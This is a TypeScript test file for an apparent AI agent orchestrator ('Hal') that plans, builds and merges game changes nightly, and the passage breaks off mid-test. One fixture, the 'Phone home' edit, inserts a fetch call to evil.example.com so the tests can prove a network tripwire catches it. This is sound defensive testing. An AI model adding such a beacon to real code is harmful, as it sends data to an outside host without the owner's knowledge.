// The run orchestrator and undo against a real temp git repo with a bare temp "origin". Claude, the play checks, ci:local
// and the candidate checks are fakes; the candidate pipeline itself is the real runCandidate (checks unsandboxed via the
// tests-only flag, except where a test proves the real path refuses without the sandbox).
import { execFileSync, spawn, spawnSync, type ChildProcess } from 'node:child_process';
import { EventEmitter } from 'node:events';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { dayOf, formatTrailers, parseTrailers, type ScoreReport, type SpendDay, type Ticket } from '@studio/core/hal';
import { secretReadPaths } from './env.js';
import type { CheckCommands } from './candidate.js';
import { runClaude, type ClaudeCall, type ClaudeResult } from './claude.js';
import { ensureMainWorktree, HAL_MAIN, runGit, type GitRunner } from './git.js';
import { acquireLock, CI_UNDO_REASON, defaultStartTime, heldCommand, lockLive, runAlert, runNight, shipPendingCommand, undoCommand, type RunDeps, type RunOptions, type RunReport } from './run.js';
import { HAL_PAUSED, parseRunArgs, realRunDeps, runRunCommand } from './cli-run.js';
import { redactor } from './run-util.js';
import { createStore } from './store.js';
import { killLiveGroups, runIsolated, sandboxAvailable } from './sandbox.js';

const KEY = 'sk-ant-test-FAKE0123456789';
const NOW = new Date('2026-11-12T03:00:00Z'); // night 2026-11-11 at tz offset 0
const NIGHT = '2026-11-11';
const gitIn = (cwd: string, ...args: string[]) => execFileSync('git', args, { cwd, encoding: 'utf8' }).trim();
const put = (root: string, rel: string, data: string | Buffer) => { mkdirSync(dirname(join(root, rel)), { recursive: true }); writeFileSync(join(root, rel), data); };
const read = (root: string, rel: string) => readFileSync(join(root, rel), 'utf8');
const J = (v: unknown) => JSON.stringify(v);
const node = (code: string) => [process.execPath, '-e', code];
const result = (v: unknown, extra = '') => node(`${extra};console.log('HAL-RESULT ' + process.env.HAL_CHECK_NONCE + ' ' + ${J(J(v))})`);
const fakeJpeg = (w: number, h: number) => Buffer.concat([
  Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x04, 0x4a, 0x46]),
  Buffer.from([0xff, 0xc0, 0x00, 0x0b, 0x08, h >> 8, h & 0xff, w >> 8, w & 0xff, 0x01, 0x01, 0x11, 0x00]),
  Buffer.from([0xff, 0xd9]),
]);
const writeJpeg = (out: string) => `const fs=require('fs'),p=require('path');fs.mkdirSync(p.dirname(${J(out)}),{recursive:true});fs.writeFileSync(${J(out)},Buffer.from(${J(fakeJpeg(390, 844).toString('hex'))},'hex'))`;

const GAME = (slug: string, version: string) => ({
  [`games/${slug}/game.yaml`]: `slug: ${slug}\ntitle: ${slug}\nversion: ${version}\nageRating: null\n`,
  [`games/${slug}/index.html`]: `<!doctype html>\n<script type="module">\nimport { createStudio } from '../sdk/studio-sdk.js';\nconst studio = createStudio({ game: '${slug}', version: '${version}', endpoint: '' });\n</script>\n`,
  [`games/${slug}/CHANGELOG.md`]: `# ${slug} changelog\n\nNewest first.\n\n## ${version} (2026-11-10)\n- First release.\n`,
  [`games/${slug}/game.js`]: `export const speed = 1;\n`,
});
const report = (game: string, fitness: number, measures: Record<string, number>): ScoreReport<unknown> => ({ game, levels: [], measures, fitness, hardFailures: [] });
const BEFORE: Record<string, ScoreReport<unknown>> = { hyperline: report('hyperline', 60, { flow: 60, fair: 70 }) };
const ok = (text: string, costUsd: number | null = 0.5): ClaudeResult => ({ ok: true, text, costUsd, subtype: 'success', limitHit: false, timedOut: false, stderrTail: '' });
const IMPL_OUT = (summary = 'Tuned speed.') => `Done.\n{"changelog": "Jumps feel smoother.", "summary": ${J(summary)}}`;

const T = (id: string, title: string, over: Partial<Ticket> = {}): Ticket => ({ id, game: 'hyperline', kind: 'tuning', title, why: 'Players miss the second jump.', ...over });
const GOOD = T('T1', 'Smoother jumps');
const TRIP = T('T2', 'Phone home');
const THIRD = T('T3', 'Brighter trail', { kind: 'polish' });

const passing: CheckCommands = {
  test: () => [node('console.log("green")')],
  typecheck: () => [node('')],
  score: (_d, s) => result({ ...BEFORE[s]!, fitness: BEFORE[s]!.fitness + 1 }),
  screens: (_d, game) => result({ game, shots: [], errors: [], reached: true, notes: [], blockedRequests: [] }),
  controls: (_d, game) => result([{ game, check: 'tap', ok: true, detail: '' }]),
  shoot: (_d, _g, out) => result({ ok: true }, writeJpeg(out)),
  fingerprint: () => result([{ key: 'same', label: 'level 1' }]),
};

let repo: string, origin: string, halDir: string, logs: string[];
let calls: ClaudeCall[];

beforeEach(() => {
  const root = realpathSync(mkdtempSync(join(tmpdir(), 'hal-run-')));
  origin = join(root, 'origin.git');
  repo = join(root, 'repo');
  gitIn(root, 'init', '-q', '--bare', '-b', 'main', origin);
  mkdirSync(repo);
  gitIn(repo, 'init', '-q', '-b', 'main');
  for (const [k, v] of [['user.name', 't'], ['user.email', 't@t'], ['commit.gpgsign', 'false']]) gitIn(repo, 'config', k!, v!);
  put(repo, '.gitignore', 'node_modules/\n.data/\n*.log\n.hal.env\n');
  put(repo, 'package.json', '{"name":"x"}\n');
  for (const [p, t] of Object.entries(GAME('hyperline', '0.3.1'))) put(repo, p, t);
  gitIn(repo, 'add', '-A');
  gitIn(repo, 'commit', '-q', '-m', 'base');
  gitIn(repo, 'remote', 'add', 'origin', origin);
  gitIn(repo, 'push', '-q', 'origin', 'main');
  put(repo, 'BRIAN.txt', 'his dirty file\n'); // Brian's checkout: never touched
  halDir = join(repo, '.data', 'hal');
  logs = []; calls = [];
});
afterEach(() => { rmSync(dirname(repo), { recursive: true, force: true }); vi.restoreAllMocks(); });

const halHead = () => gitIn(repo, 'rev-parse', HAL_MAIN);
const originMain = () => gitIn(origin, 'rev-parse', 'refs/heads/main');
const brianMain = () => gitIn(repo, 'rev-parse', 'refs/heads/main');
const readReport = (): RunReport => {
  const latest = JSON.parse(read(halDir, 'latest.json')) as { runId: string; reportMd: string };
  return JSON.parse(readFileSync(join(dirname(latest.reportMd), 'report.json'), 'utf8')) as RunReport;
};
const seedSpend = (usd: number) => {
  const day: SpendDay = { day: dayOf(NOW), calls: usd > 0 ? [{ run: 'earlier', role: 'implementer', billing: 'api', usd, at: NOW.toISOString() }] : [] };
  put(halDir, 'spend.json', J([day]));
};
const spendCalls = () => (JSON.parse(read(halDir, 'spend.json')) as SpendDay[]).find((d) => d.day === dayOf(NOW))!.calls;

type ClaudeOpts = {
  tickets?: Ticket[];
  plannerText?: string;
  costs?: Partial<Record<string, number | null>>;
  implementer?: Record<string, { edit?: (cwd: string) => void; summary?: string }>;
  director?: unknown;
  onCall?: (call: ClaudeCall) => void;
};
const EDITS: Record<string, (cwd: string) => void> = {
  'Smoother jumps': (cwd) => put(cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n'),
  'Phone home': (cwd) => put(cwd, 'games/hyperline/game.js', "export const speed = 1;\nfetch('https://evil.example.com/beacon');\n"),
  'Brighter trail': (cwd) => put(cwd, 'games/hyperline/game.js', 'export const speed = 1;\nexport const trail = 2;\n'),
};
function fakeClaude(o: ClaudeOpts = {}): RunDeps['claude'] {
  const cost = (k: string, d: number) => (o.costs && Object.hasOwn(o.costs, k) ? o.costs[k]! : d);
  return async (call) => {
    calls.push(call);
    o.onCall?.(call);
    if (call.role === 'planner') return ok(o.plannerText ?? `Here you go:\n${J({ tickets: o.tickets ?? [GOOD] })}`, cost('planner', 0.5));
    if (call.role === 'director') {
      return ok(J(o.director ?? { note: 'A good night for Hyperline.', perGame: { hyperline: 'Hyperline kept its snap.' }, noteReplies: [] }), cost('director', 0.2));
    }
    const title = Object.keys(EDITS).find((t) => call.prompt.includes(t))!;
    (o.implementer?.[title]?.edit ?? EDITS[title]!)(call.cwd);
    return ok(IMPL_OUT(o.implementer?.[title]?.summary), cost(title, 0.5));
  };
}

const fakePlay = (over: Partial<RunDeps['play']> = {}): RunDeps['play'] => ({
  score: async (_dir, s) => BEFORE[s]!,
  screens: async (_dir, game) => ({ game, shots: [], errors: [], reached: true, notes: [], blockedRequests: [] }),
  controls: async (_dir, game) => [{ game, check: 'tap', ok: true, detail: '' }],
  ...over,
});

function deps(over: Partial<RunDeps> = {}): RunDeps {
  return {
    repo, halDir, now: () => NOW, tzOffsetMinutes: 0, model: 'test-model', secrets: [KEY], hasApiKey: true,
    claude: fakeClaude(), play: fakePlay(), ciLocal: async () => ({ ok: true, detail: 'ok' }),
    candidateCtx: { commands: passing, unsandboxedForTests: true, countTests: async () => ({ before: 3, after: 3 }) },
    undoTest: () => [node('')], unsandboxedForTests: true,
    log: (l) => { logs.push(l); },
    proc: Object.assign(new EventEmitter(), { exit: vi.fn() }),
    ...over,
  };
}
const opts = (over: Partial<RunOptions> = {}): RunOptions => ({
  games: ['hyperline'], kinds: [], reportOnly: false, maxTickets: 6, trigger: 'nightly', billing: 'api', push: true, ...over,
});

describe('full fake run', () => {
  it('merges a good ticket, discards a tripwire, skips one on budget; report.json has all three; pushes to origin', async () => {
    // 7.50 left of the $20 cap, 7.00 to slice (R21's 0.50 margin): planner 1.50, then the director's 1.00 is held, so
    // the implementers get 3.00 and 1.50, the third ticket nothing, and the director its 1.00 at the end.
    seedSpend(12.5);
    const brian = brianMain();
    const code = await runNight(opts(), deps({ claude: fakeClaude({ tickets: [GOOD, TRIP, THIRD], costs: { planner: 1.5, 'Smoother jumps': 3, 'Phone home': null, director: null } }) }));
    expect(code).toBe(0);
    const r = readReport();
    expect(r.changes.map((c) => [c.ticket.id, c.verdict])).toEqual([['T1', 'merged'], ['T2', 'discarded'], ['T3', 'skipped']]);
    expect(r.changes[0]!.pass).toBe('HAL-001');
    expect(r.changes[0]!.version).toBe('0.3.2');
    expect(r.changes[1]!.reasons.join('\n')).toMatch(/tripwire network/);
    expect(r.changes[2]!.reasons).toEqual(['budget']);
    expect(r.capReached).toBe(true);
    expect(r).toMatchObject({ night: NIGHT, trigger: 'nightly', billing: 'api', pushed: true });
    expect(r.spend.api).toBe(7); // never past 19.50 for slicing; the report still shows the $20 cap
    expect(Object.keys(r).sort()).toEqual(['billing', 'billingEnded', 'calls', 'capReached', 'changes', 'endedAt', 'games', 'night', 'notes', 'perGame', 'planned', 'pushed', 'runId', 'spend', 'startedAt', 'trigger', 'warnings'].sort());
    expect(r.planned).toEqual([]); // all built or tried
    expect(r.games.hyperline).toMatchObject({ before: { hyperline: 60 }, after: { hyperline: 61 } });
    // R21: the director's $1 was held through the builds, so the note still got written by the director.
    expect(calls.map((c) => [c.role, c.maxBudgetUsd])).toEqual([['planner', 1.5], ['implementer', 3], ['implementer', 1.5], ['director', 1]]);
    const runDir = join(halDir, 'runs', r.runId);
    expect(read(runDir, 'note.md')).toMatch(/A good night for Hyperline/);
    expect(read(runDir, 'report.md')).toContain('the daily API cap is $20.00');
    expect(read(runDir, 'report.md')).toMatch(/HAL-001/);
    // refs/hal/main: the merge, then the history-note commit with Hal-Run; origin's main equals it.
    expect(gitIn(repo, 'log', '-1', '--format=%B', HAL_MAIN)).toMatch(new RegExp(`Hal-Run: ${r.runId}`));
    expect(gitIn(repo, 'show', `${HAL_MAIN}:docs/hal/history/hyperline/${NIGHT}/note.md`)).toMatch(/HAL-001/);
    expect(r.perGame).toEqual({ hyperline: 'Hyperline kept its snap.' });
    const scores = JSON.parse(gitIn(repo, 'show', `${HAL_MAIN}:docs/hal/history/hyperline/${NIGHT}/scores.json`)) as { night: string; runs: { run: string; at: string; scorers: Record<string, { fitness: number }> }[] };
    expect(scores.night).toBe(NIGHT);
    expect(scores.runs).toHaveLength(1);
    expect(scores.runs[0]).toMatchObject({ run: r.runId, at: NOW.toISOString(), scorers: { hyperline: { fitness: 61 } } });
    expect(gitIn(repo, 'rev-list', '--count', `${brian}..${HAL_MAIN}`)).toBe('2');
    expect(originMain()).toBe(halHead());
    expect(brianMain()).toBe(brian);
    expect(read(repo, 'BRIAN.txt')).toBe('his dirty file\n');
    expect(gitIn(repo, 'status', '--porcelain')).toBe('?? BRIAN.txt');
    // Ledger: the two attempts, with their costs (unknown cost = the whole slice).
    const ledger = JSON.parse(read(halDir, 'ledger.json')) as { passes: { id: string; kept: boolean; costUsd: number }[] };
    expect(ledger.passes.map((p) => [p.id, p.kept, p.costUsd])).toEqual([['HAL-001', true, 3], ['HAL-002', false, 1.5]]);
    expect(existsSync(join(halDir, 'run.lock'))).toBe(false);
    expect(readdirSync(join(halDir, 'wt'))).toEqual(['main']);
  }, 60_000);

  it('the next candidate after a merge starts from the merged scores (no stale baseline)', async () => {
    const two = T('T2b', 'Brighter trail', { kind: 'polish' });
    const code = await runNight(opts(), deps({
      claude: fakeClaude({ tickets: [GOOD, two] }),
      candidateCtx: { commands: { ...passing, score: (_d, s) => result({ ...BEFORE[s]!, fitness: 61 }) }, unsandboxedForTests: true, countTests: async () => ({ before: 3, after: 3 }) },
    }));
    expect(code).toBe(0);
    const r = readReport();
    expect(r.changes.map((c) => c.verdict)).toEqual(['merged', 'merged']);
    expect(r.changes[1]!.scoresBefore.hyperline!.fitness).toBe(61);
  }, 60_000);
});

describe('history scores and director feedback', () => {
  it('a second run the same night appends to scores.json, even with no changes', async () => {
    expect(await runNight(opts({ push: false }), deps({ claude: fakeClaude({ tickets: [] }) }))).toBe(0);
    const first = readReport().runId;
    expect(await runNight(opts({ push: false }), deps({ claude: fakeClaude({ tickets: [], director: { note: 'n', perGame: {}, noteReplies: [] } }) }))).toBe(0);
    const second = readReport().runId;
    expect(second).not.toBe(first);
    const f = JSON.parse(gitIn(repo, 'show', `${HAL_MAIN}:docs/hal/history/hyperline/${NIGHT}/scores.json`)) as { runs: { run: string }[] };
    expect(f.runs.map((x) => x.run)).toEqual([first, second]);
  }, 60_000);
  it('the director prompt contains the recorded votes and undo reasons', async () => {
    put(halDir, 'feedback.json', J({ votes: [{ run: 'r0', item: 'c1', game: 'hyperline', vote: 'down', comment: 'too floaty', at: 'x' }], undos: [{ run: 'r0', reason: 'bouncy mess', at: 'x' }] }));
    await runNight(opts({ push: false }), deps({ claude: fakeClaude({ tickets: [] }) }));
    const p = calls.find((c) => c.role === 'director')!.prompt;
    expect(p).toContain('too floaty');
    expect(p).toContain('bouncy mess');
  }, 60_000);
});

describe('lock', () => {
  it('a second run while a live pid holds the lock exits 2 with "busy" and touches nothing', async () => {
    put(halDir, 'run.lock', J({ pid: process.pid, runId: 'other', startedAt: new Date().toISOString() }));
    const claude = vi.fn();
    expect(await runNight(opts(), deps({ claude }))).toBe(2);
    expect(logs.join('\n')).toMatch(/busy/);
    expect(claude).not.toHaveBeenCalled();
    expect(JSON.parse(read(halDir, 'run.lock')).runId).toBe('other');
  });
  it('a dead pid\'s lock is taken over; the lock carries pid, runId, startedAt, trigger and the phase, and is removed after', async () => {
    const dead = spawnSync(process.execPath, ['-e', '']).pid!;
    put(halDir, 'run.lock', J({ pid: dead, runId: 'crashed', startedAt: NOW.toISOString() }));
    const seen: unknown[] = [];
    const code = await runNight(opts({ reportOnly: true }), deps({ claude: fakeClaude({ onCall: () => seen.push(JSON.parse(read(halDir, 'run.lock'))) }) }));
    expect(code).toBe(0);
    expect(seen[0]).toMatchObject({ pid: process.pid, trigger: 'nightly', phase: 'plan' });
    expect(typeof (seen[0] as { startedAt: string }).startedAt).toBe('string');
    expect(existsSync(join(halDir, 'run.lock'))).toBe(false);
  });
  it('acquireLock: second acquire is busy while held; release only removes our own lock', () => {
    const a = acquireLock(halDir, { pid: process.pid, runId: 'a', startedAt: new Date().toISOString() });
    expect('busy' in a).toBe(false);
    const b = acquireLock(halDir, { pid: process.pid, runId: 'b', startedAt: new Date().toISOString() });
    expect('busy' in b && b.busy.runId).toBe('a');
    if (!('busy' in a)) a.release();
    expect(existsSync(join(halDir, 'run.lock'))).toBe(false);
  });
  it('the lock is removed in finally when a phase throws; the run exits 1 and still writes a report', async () => {
    const failing: GitRunner = async (args, cwd, o) => { if (args.includes('worktree') && args.includes('prune')) throw new Error('git exploded'); return runGit(args, cwd, o); };
    expect(await runNight(opts(), deps({ git: failing }))).toBe(1);
    expect(existsSync(join(halDir, 'run.lock'))).toBe(false);
    expect(readReport().warnings.join('\n')).toMatch(/git exploded/);
  });
});

describe('stop', () => {
  it('the stop flag (written mid-run) skips the remaining candidates; the note and report are still written', async () => {
    put(halDir, 'stop', 'old flag from yesterday'); // cleared at start
    const code = await runNight(opts(), deps({
      claude: fakeClaude({ tickets: [GOOD, TRIP, THIRD], implementer: { 'Smoother jumps': { edit: (cwd) => { EDITS['Smoother jumps']!(cwd); put(halDir, 'stop', 'now'); } } } }),
    }));
    expect(code).toBe(0);
    const r = readReport();
    expect(r.changes.map((c) => [c.verdict, c.reasons])).toEqual([['merged', []], ['skipped', ['stopped']], ['skipped', ['stopped']]]);
    expect(calls.map((c) => c.role)).toEqual(['planner', 'implementer', 'director']);
    expect(read(join(halDir, 'runs', r.runId), 'note.md')).toContain('A good night for Hyperline.');
    expect(gitIn(repo, 'show', `${HAL_MAIN}:docs/hal/history/hyperline/${NIGHT}/note.md`)).toContain('Hyperline kept its snap.');
  }, 60_000);
  it('`hal stop` writes the stop flag', async () => {
    expect(await runRunCommand('stop', [], { halDir, games: ['hyperline'] })).toBe(0);
    expect(existsSync(join(halDir, 'stop'))).toBe(true);
  });
});

describe('report-only', () => {
  it('plays and plans but never creates a candidate worktree, commits nothing and pushes nothing', async () => {
    const subs: string[][] = [];
    const recording: GitRunner = async (args, cwd, o) => { subs.push(args); return runGit(args, cwd, o); };
    const before = halHead.bind(null);
    const candidate = vi.fn();
    const code = await runNight(opts({ reportOnly: true }), deps({ git: recording, candidate, claude: fakeClaude({ tickets: [GOOD, TRIP] }) }));
    expect(code).toBe(0);
    expect(candidate).not.toHaveBeenCalled();
    const adds = subs.filter((a) => a.includes('worktree') && a.includes('add'));
    expect(adds.every((a) => a.some((x) => x.endsWith(join('wt', 'main'))))).toBe(true);
    expect(subs.some((a) => a.includes('-b') && a.some((x) => x.startsWith('hal/')))).toBe(false);
    expect(readdirSync(join(halDir, 'wt'))).toEqual(['main']);
    expect(gitIn(repo, 'rev-list', '--count', `${brianMain()}..${before()}`)).toBe('0');
    const r = readReport();
    expect(r.changes).toEqual([]);
    expect(r.planned.map((t) => t.id)).toEqual(expect.arrayContaining([GOOD.id]));
    expect(read(join(halDir, 'runs', r.runId), 'report.md')).toMatch(/## Planned, not built\n\n- T1 /);
    expect(calls.map((c) => c.role)).toEqual(['planner', 'director']);
    expect(calls[1]!.prompt).toMatch(/report-only/);
    expect(r.pushed).toBe(false);
    expect(r.pushSkippedReason).toBe('--report-only');
    expect(existsSync(join(halDir, 'runs', r.runId, 'play', 'scores.json'))).toBe(true);
  });
  it('a liability ticket without an approval becomes a call; with one it is built', async () => {
    const lia = T('T9', 'Brighter trail', { liability: 'Google Fonts host fonts.googleapis.com' });
    await runNight(opts({ reportOnly: true }), deps({ claude: fakeClaude({ tickets: [lia] }) }));
    expect(readReport().calls.map((c) => c.liability)).toEqual(['Google Fonts host fonts.googleapis.com']);
  });
});

describe('no key anywhere', () => {
  it('after a full fake run that sees the key everywhere, nothing under .data (or the prompts, logs, git) contains it', async () => {
    put(halDir, 'notes.json', J([{ id: 'N-001', at: NOW.toISOString(), game: 'hyperline', text: 'make it zippier', status: 'open' }]));
    const leaky = { ...GOOD, why: `Players miss the jump ${KEY}` };
    const code = await runNight(opts(), deps({
      play: fakePlay({ screens: async (_d, game) => ({ game, shots: [], errors: [`console: token ${KEY}`], reached: true, notes: [], blockedRequests: [] }) }),
      ciLocal: async () => ({ ok: false, detail: `npm test printed ${KEY}` }),
      claude: fakeClaude({
        tickets: [leaky, TRIP], implementer: { 'Smoother jumps': { summary: `used ${KEY}` } },
        director: { note: `Note ${KEY}`, perGame: { hyperline: `Game ${KEY}` }, noteReplies: [{ id: 'N-001', status: 'acted', reply: `Done ${KEY}` }] },
      }),
    }));
    expect(code).toBe(0);
    const hits: string[] = [];
    const walk = (d: string) => {
      for (const e of readdirSync(d, { withFileTypes: true })) {
        const p = join(d, e.name);
        if (e.isSymbolicLink()) continue;
        if (e.isDirectory()) walk(p);
        else if (statSync(p).isFile() && readFileSync(p).includes(KEY)) hits.push(p);
      }
    };
    walk(join(repo, '.data'));
    expect(hits).toEqual([]);
    expect(calls.some((c) => c.prompt.includes(KEY))).toBe(false);
    expect(logs.join('\n')).not.toContain(KEY);
    expect(gitIn(repo, 'log', '-p', HAL_MAIN)).not.toContain(KEY);
    expect(JSON.parse(read(halDir, 'notes.json'))[0]).toMatchObject({ id: 'N-001', status: 'acted', reply: 'Done [REDACTED]' });
  }, 60_000);
  it('redactor walks nested values', () => {
    const r = redactor([KEY]);
    expect(r.deep({ a: [`x${KEY}`], [`k${KEY}`]: { b: KEY } })).toEqual({ a: ['x[REDACTED]'], 'k[REDACTED]': { b: '[REDACTED]' } });
  });
});

describe('end-of-run alert', () => {
  const base = { code: 0, phase: 'report', trigger: 'nightly' as const, pushed: true, warnings: [] as string[], changes: [{ verdict: 'merged' }, { verdict: 'discarded' }] };
  it('a failed run, a push that did not happen for a reason Brian did not choose, or "needs you" always alert', () => {
    expect(runAlert({ ...base, code: 1, phase: 'build HAL-003 (2/4)' })).toEqual({ title: 'Hal: the run failed', body: 'It stopped in build HAL-003 (2/4). 1 merged, 1 dropped. Open the report for details.' });
    expect(runAlert({ ...base, pushed: false, pushSkippedReason: 'push failed' })?.title).toBe('Hal: nothing was pushed');
    expect(runAlert({ ...base, warnings: ['ci:local fails on origin/main itself ... it needs you.'] })?.title).toBe('Hal needs you');
  });
  it('a clean nightly run, and pushes Brian turned off, stay quiet; a clean run he started says it is done', () => {
    expect(runAlert(base)).toBeNull();
    for (const why of ['--no-push', '--report-only', 'nothing new to push']) expect(runAlert({ ...base, pushed: false, pushSkippedReason: why })).toBeNull();
    expect(runAlert({ ...base, trigger: 'manual' })).toEqual({ title: 'Hal: run done', body: '1 merged, 1 dropped, pushed.' });
  });
  it('runNight calls notify with the alert', async () => {
    const notify = vi.fn();
    await runNight(opts({ trigger: 'manual' }), deps({ notify }));
    expect(notify).toHaveBeenCalledTimes(1);
    expect(notify.mock.calls[0]![0]).toBe('Hal: run done');
  }, 60_000);
});

describe('lessons (what Hal learns across nights)', () => {
  const night1 = { note: 'n', perGame: {}, noteReplies: [], lessons: { add: [
    { game: 'hyperline', text: 'Hyperline: a wider gap fixed noSpikes (HAL-001).' },
    { game: 'pong', text: 'not a game we have' },
    { game: null, text: '  Whole studio:\n one line  ' },
    ...Array.from({ length: 6 }, (_, i) => ({ game: 'hyperline', text: `extra ${i}` })),
  ] } };
  it('the director adds lessons (known games or the studio, one line, at most 5 a night); the next planner and director read them', async () => {
    await runNight(opts(), deps({ claude: fakeClaude({ director: night1 }) }));
    const saved = JSON.parse(read(halDir, 'lessons.json')) as Array<{ id: string; game: string | null; text: string; run: string }>;
    expect(saved.map((l) => [l.id, l.game, l.text])).toEqual([
      ['L-001', 'hyperline', 'Hyperline: a wider gap fixed noSpikes (HAL-001).'],
      ['L-002', null, 'Whole studio: one line'],
      ['L-003', 'hyperline', 'extra 0'], ['L-004', 'hyperline', 'extra 1'], ['L-005', 'hyperline', 'extra 2'],
    ]);
    calls.length = 0;
    await runNight(opts(), deps({ claude: fakeClaude({ director: { note: 'n', perGame: {}, noteReplies: [], lessons: { retire: ['L-003', 'L-999'], add: [{ game: 'hyperline', text: 'Hyperline: a wider gap fixed noSpikes (HAL-001).' }] } } }) }));
    for (const role of ['planner', 'director']) expect(calls.find((c) => c.role === role)!.prompt, role).toContain('a wider gap fixed noSpikes');
    const after = JSON.parse(read(halDir, 'lessons.json')) as Array<{ id: string }>;
    expect(after.map((l) => l.id)).toEqual(['L-001', 'L-002', 'L-004', 'L-005']); // L-003 retired; the repeat not re-added
  }, 90_000);
  it('no lessons yet: the prompts say so', async () => {
    await runNight(opts(), deps());
    expect(calls.find((c) => c.role === 'planner')!.prompt).toContain('(none yet)');
  }, 60_000);
});

describe('new features wait for Brian', () => {
  const FEATURE = T('T9', 'Brighter trail', { kind: 'feature' });
  const heldRefs = () => gitIn(repo, 'for-each-ref', '--format=%(refname)', 'refs/hal/held/').split('\n').filter(Boolean);
  const showOrigin = (path: string) => { try { return gitIn(origin, 'show', `refs/heads/main:${path}`); } catch { return null; } };
  it('a feature is built last and held; the rest of the night merges and ships; the planner sees it next time', async () => {
    await runNight(opts(), deps({ claude: fakeClaude({ tickets: [FEATURE, GOOD] }) }));
    const r = readReport();
    expect(r.changes.map((c) => [c.ticket.title, c.verdict])).toEqual([['Smoother jumps', 'merged'], ['Brighter trail', 'held']]);
    expect(r.pushed).toBe(true);
    expect(heldRefs()).toEqual([`refs/hal/held/${r.changes[1]!.pass}`]);
    expect(showOrigin('games/hyperline/game.js')).toBe('export const speed = 1.2;'); // the tuning shipped, the feature did not
    calls.length = 0;
    await runNight(opts(), deps());
    expect(calls.find((c) => c.role === 'planner')!.prompt).toMatch(new RegExp(`- ${r.changes[1]!.pass}: feature\\(hyperline\\): Brighter trail`));
  }, 120_000);
  it('hal ship puts it on main, runs ci:local and pushes; hal drop deletes it', async () => {
    await runNight(opts(), deps({ claude: fakeClaude({ tickets: [FEATURE] }) }));
    const pass = readReport().changes[0]!.pass;
    const ci = vi.fn(async () => ({ ok: true, detail: 'passed' }));
    expect(await heldCommand('ship', pass, { push: true }, deps({ ciLocal: ci }))).toBe(0);
    expect(heldRefs()).toEqual([]);
    expect(showOrigin('games/hyperline/game.js')).toContain('trail');
    expect(ci).toHaveBeenCalledWith(halHead());
    expect(feedback().held).toEqual([expect.objectContaining({ pass, decision: 'ship', status: 'done', commit: halHead() })]);
    expect(await heldCommand('drop', pass, { push: true }, deps())).toBe(0); // already shipped: nothing held, recorded
  }, 120_000);
  it('a rebuild of a feature Brian said ship (it no longer applied) merges and ships; the approval is used once', async () => {
    const approved = { pass: 'HAL-050', run: 'r0', decision: 'ship', status: 'done', at: '2026-11-21T00:00:00Z', error: 'no longer applies', game: 'hyperline', title: 'Brighter trail', heldCommit: 'abc123' };
    mkdirSync(halDir, { recursive: true });
    writeFileSync(join(halDir, 'feedback.json'), J({ votes: [], undos: [], held: [approved] }));
    const rebuild = { ...FEATURE, rebuildOf: 'HAL-050' };
    calls.length = 0;
    await runNight(opts(), deps({ claude: fakeClaude({ tickets: [rebuild] }) }));
    const r = readReport();
    expect(r.changes.map((c) => c.verdict)).toEqual(['merged']);
    expect(heldRefs()).toEqual([]);
    expect(showOrigin('games/hyperline/game.js')).toContain('trail');
    expect(calls.find((c) => c.role === 'implementer')!.prompt).toContain('npm run hal -- git show abc123');
    expect(feedback().held![0]).toMatchObject({ pass: 'HAL-050', rebuiltAs: r.changes[0]!.pass });
    expect(await createStore({ halDir }).approvedRebuilds()).toEqual([]); // used
  }, 180_000);
  it('a rebuildOf that names no approval, or another game\'s, is held like any feature', async () => {
    mkdirSync(halDir, { recursive: true });
    writeFileSync(join(halDir, 'feedback.json'), J({ votes: [], undos: [], held: [{ pass: 'HAL-050', run: 'r0', decision: 'ship', status: 'done', at: 'x', error: 'e', game: 'gearhold' }] }));
    await runNight(opts(), deps({ claude: fakeClaude({ tickets: [{ ...FEATURE, rebuildOf: 'HAL-050' }] }) }));
    expect(readReport().changes.map((c) => c.verdict)).toEqual(['held']);
  }, 120_000);
  it('hal ship --pending applies every saved decision under one lock, then runs ci:local and pushes once', async () => {
    await runNight(opts(), deps({ claude: fakeClaude({ tickets: [FEATURE] }) }));
    const pass = readReport().changes[0]!.pass;
    const st = createStore({ halDir });
    await st.recordHeld({ pass, run: 'r', decision: 'ship', status: 'pending' });
    const ci = vi.fn(async () => ({ ok: true, detail: 'passed' }));
    expect(await shipPendingCommand({ push: true }, deps({ ciLocal: ci }))).toBe(0);
    expect(heldRefs()).toEqual([]);
    expect(showOrigin('games/hyperline/game.js')).toContain('trail');
    expect(ci).toHaveBeenCalledTimes(1);
    expect(await shipPendingCommand({ push: true }, deps({ ciLocal: ci }))).toBe(0); // nothing pending: nothing to do
    expect(ci).toHaveBeenCalledTimes(1);
  }, 120_000);
  it('a decision made while Hal is busy is saved, and the next run applies it before building', async () => {
    await runNight(opts(), deps({ claude: fakeClaude({ tickets: [FEATURE] }) }));
    const pass = readReport().changes[0]!.pass;
    writeFileSync(join(halDir, 'run.lock'), J({ pid: process.pid, runId: 'other', startedAt: new Date(Date.now() + 1000).toISOString(), phase: 'plan' }));
    expect(await heldCommand('drop', pass, { push: false }, deps())).toBe(2);
    expect(heldRefs()).toHaveLength(1);
    rmSync(join(halDir, 'run.lock'));
    await runNight(opts(), deps());
    expect(heldRefs()).toEqual([]);
    expect(readReport().warnings.join('\n')).toMatch(new RegExp(`dropped ${pass} \\(Brian's 👎\\)`));
  }, 120_000);
});

describe('"Hal asks": a protected-change request is held and recorded', () => {
  const JUDGE = 'packages/core/test/hal-hyperline-score.test.ts';
  const SECTOR = T('T7', 'A fourth sector', { kind: 'feature' });
  const WHY = 'hal-hyperline-score.test.ts pins 3 sectors';
  it('held with its why: the ledger says "held: asks", the report carries the diff, and the next planner sees it waiting', async () => {
    put(repo, JUDGE, 'import x;\nexpect(sectors).toBe(3);\n// end\n');
    gitIn(repo, 'add', JUDGE);
    gitIn(repo, 'commit', '-q', '-m', 'judge');
    gitIn(repo, 'push', '-q', 'origin', 'main');
    const base = fakeClaude({ tickets: [SECTOR] });
    const claude: RunDeps['claude'] = async (call) => {
      if (call.role !== 'implementer') return base(call);
      calls.push(call);
      put(call.cwd, 'games/hyperline/game.js', 'export const speed = 1;\nexport const sectors = 4;\n');
